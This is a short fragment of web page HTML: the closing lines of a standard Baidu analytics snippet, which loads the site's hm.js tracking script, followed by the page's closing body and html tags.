e=document.createElement("script");e.src="//hm.baidu.com/hm.js?94cb135e2b01d42780f4972cb63e3884";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script></body></html>